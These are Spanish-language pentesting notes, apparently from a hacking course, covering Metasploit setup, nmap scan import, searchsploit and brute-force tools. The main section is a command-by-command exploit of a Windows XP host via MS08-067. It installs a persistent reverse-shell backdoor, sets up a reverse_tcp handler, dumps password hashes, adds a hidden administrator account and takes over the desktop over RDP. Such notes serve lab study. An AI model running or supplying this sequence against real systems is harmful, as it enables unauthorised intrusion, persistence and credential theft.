# EXPLOTACION

## Metasploit

`service postgresql start`

`netstat -antp`

`msfdb init`--> inicializar la base de datos

`msfconsole` --> iniciamos el framework Metasploit
       =[ metasploit v5.0.100-dev                         ]
+ -- --=[ 2046 exploits - 1107 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion  

## Páginas con mas exploits\
https://opendata.rapid7.com/ 

https://www.exploit-db.com/

https://en.0day.today/

`nmap 192.168.1.0/24 -A -v -oA cphe` --> escaneo grande verbose y la salida de datos a un fichero llamado cphe

importar archivo cphe en metasploit

`hosts`

`db_status`

`db_import cphe.xml` --> ojo con la ruta
hosts
services
services -p 21 --> muestar los puertos 21 abiertos
Checkear logins para probar pass/user por defecto

`searchsploit < version app >` --> busca en varios lugares

`search < version app >` --> busco en metasploit
~~~
use auxiliary/scanner/ftp/anonymous
show options
info
set RHOSTS 192.168.1.123 192.168.1.122
run
~~~

`searchsploit tomcat` --> buscar 

`setg rhosts 192.68.1.123 192.168.1.122` --> La g es para guardar los host durante toda la sesion.

search CVE code

## Ataques automatizados
Nessus --> https://es-la.tenable.com/products/nessus/nessus-professional

## Ataque por fuerza bruta

### xHydra
Interfaz grafica, abajo a la izquierda pone el comando para terminal con las opciones configuradas


### Explotacion maquina XP dejando backdoor

`nmap 192.168.24.128 -v -Pn` --> 31337/tcp --> backdoor
~~~
search netapi
use exploit/windows/smb/ms08_067_netapi
show options
exploit
~~~

meterpreter > getuid --> AUTOHIRY 

meterpreter > run persistence -U -X -i 60 -p 4443 -r <nuestra ip> 

-U: conecta con el atacante cuando se inicia sesion en la victima

-X: intenta conectar cuando inicie/reinicie

-i: cada 60 segundos conecta 

background

* search /multi/handler --> generico 
* use exploit/multi/handler 
* set payload windows/meterpreter/reverse_tcp
* show options
* set lport y lhost
* exploit

Reiniciar el windows XP para confirmar que cuando inicie sesion se conecta automaticamente.
background
sessions
getuid
hashdump --> password cracking

shell

cd ..

cd ..

c:\> net user intruso pass1234 /add  --> añadir usuario

net localgroup administradores intruso /add --> añadir usuario al grupo administrador para tener permisos

rdesktop <ip windows>  --> echa a la victima si esta conectado






